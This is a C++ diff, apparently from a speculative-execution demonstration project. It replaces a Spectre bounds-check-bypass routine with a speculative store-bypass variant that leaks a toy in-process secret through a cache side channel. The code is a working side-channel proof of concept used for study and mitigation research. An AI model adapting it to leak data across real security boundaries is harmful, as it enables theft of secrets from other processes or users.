@@ -32,6 +32,7 @@
 //
 const char *public_data = "Hello, world!";
 const char *private_data = "It's a s3kr3t!!!";
+constexpr size_t kArrayLength = 64;
 
 // Leaks the byte that is physically located at &text[0] + offset, without ever
 // loading it. In the abstract machine, and in the code executed by the CPU,
@@ -44,47 +45,54 @@ const char *private_data = "It's a s3kr3t!!!";
 static char leak_byte(const char *data, size_t offset) {
   CacheSideChannel sidechannel;
   const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();
-  // The size needs to be unloaded from cache to force speculative execution
-  // to guess the result of comparison.
-  //
-  // TODO: since size_in_heap is no longer the only heap-allocated value, it
-  // should be allocated into its own unique page
-  std::unique_ptr<size_t> size_in_heap = std::unique_ptr<size_t>(
-      new size_t(strlen(data)));
+  std::unique_ptr<std::array<size_t *, kArrayLength>> array_of_pointers =
+      std::unique_ptr<std::array<size_t *, kArrayLength>>(
+          new std::array<size_t *, kArrayLength>);
 
   for (int run = 0;; ++run) {
     sidechannel.FlushOracle();
+
     // We pick a different offset every time so that it's guaranteed that the
     // value of the in-bounds access is usually different from the secret value
     // we want to leak via out-of-bounds speculative access.
-    int safe_offset = run % strlen(data);
+    size_t safe_offset = run % strlen(data);
 
-    // Loop length must be high enough to beat branch predictors.
-    // The current length 2048 was established empirically. With significantly
-    // shorter loop lengths some branch predictors are able to observe the
-    // pattern and avoid branch mispredictions.
-    for (size_t i = 0; i < 2048; ++i) {
-      // Remove from cache so that we block on loading it from memory,
-      // triggering speculative execution.
-      CLFlush(size_in_heap.get());
+    // Junk value and stack value with the offset that will be used for
+    // accessing the oracle.
+    size_t junk, local_offset;
 
-      // Train the branch predictor: perform in-bounds accesses 2047 times,
-      // and then use the out-of-bounds offset we _actually_ care about on the
-      // 2048th time.
-      // The local_offset value computation is a branchless equivalent of:
-      // size_t local_offset = ((i + 1) % 2048) ? safe_offset : offset;
-      // We need to avoid branching even for unoptimized compilation (-O0).
-      // Optimized compilations (-O1, concretely -fif-conversion) would remove
-      // the branching automatically.
-      size_t local_offset =
-          offset + (safe_offset - offset) * (bool)((i + 1) % 2048);
+    // Array of pointers initialized so that each array item points initially to
+    // the junk value.
+    for (auto &pointer : *array_of_pointers) {
+      pointer = &junk;
+    }
 
-      if (local_offset < *size_in_heap) {
-        // This branch was trained to always be taken during speculative
-        // execution, so it's taken even on the tenth iteration, when the
-        // condition is false!
-        ForceRead(&isolated_oracle[(size_t)(data[local_offset])]);
-      }
+    // One of the pointers is changed so that it points to the local offset
+    // value.
+    size_t local_pointer_index = run % kArrayLength;
+    (*array_of_pointers)[local_pointer_index] = &local_offset;
+
+    for (size_t i = 0; i <= local_pointer_index; ++i) {
+      // This is the same as:
+      // local_offset = (i == local_pointer_index) ? offset : safe_offset;
+      // Only when i is at the local_pointer_offset it assigns the unsafe
+      // offset to the local_offset.
+      local_offset =
+          offset + (safe_offset - offset) * (bool)(i - local_pointer_index);
+
+      // We always flush the pointer, so that its access is slower.
+      CLFlush(&*array_of_pointers);
+      CLFlush(&(*array_of_pointers)[i]);
+
+      // When i is at the local_pointer_index, we slowly copy safe_offset into
+      // the local_offset. Otherwise we just copy the safe_offset to junk. After
+      // this operation, the local_offset is always equal to the safe_offset.
+      (*array_of_pointers)[i][0] = safe_offset;
+
+      // Speculative fetch at the local_offset. Architecturally it fetches
+      // always at the safe_offset, though speculatively it prefetches the
+      // unsafe offset when i is at the local_pointer_index.
+      ForceRead(&isolated_oracle[(size_t)(data[local_offset])]);
     }
 
     std::pair<bool, char> result =
